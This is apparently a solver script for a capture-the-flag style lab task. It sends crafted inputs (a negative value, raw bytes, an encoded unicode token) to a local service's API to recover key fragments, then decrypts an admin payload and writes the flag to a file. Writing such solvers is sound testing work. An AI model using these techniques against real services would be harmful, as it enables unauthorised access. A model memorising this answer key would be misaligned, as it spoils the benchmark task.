#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"
PORT="${PORT:-8297}"
FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"
python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import hashlib, json, struct, sys, base64, re
from urllib.request import Request, urlopen
host, port = sys.argv[1], sys.argv[2]
base = f'http://{host}:{port}'
req = Request(base + "/api/session", data=b"{}", headers={"Content-Type": "application/json"}, method="POST")
sid = json.loads(urlopen(req, timeout=5).read())["session"]
body = json.dumps({"value": -7}).encode()
req = Request(base + "/api/value", data=body, headers={"X-Session": sid, "Content-Type": "application/json"}, method="POST")
hex_a = json.loads(urlopen(req, timeout=5).read())["fragment"]
req = Request(base + "/api/verify", data=b"\x00\xc8", headers={"X-Session": sid}, method="POST")
hex_b = json.loads(urlopen(req, timeout=5).read())["fragment"]
req = Request(base + "/api/token/%C2%BD", headers={"X-Session": sid})
hex_c = json.loads(urlopen(req, timeout=5).read())["fragment"]
key = hashlib.sha256((hex_a + hex_b + hex_c).encode()).digest()[:32]
req = Request(base + "/api/admin", headers={"X-Session": sid})
payload = urlopen(req, timeout=5).read()
encrypted = payload[4:]
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted)).decode()
print(flag)
PY
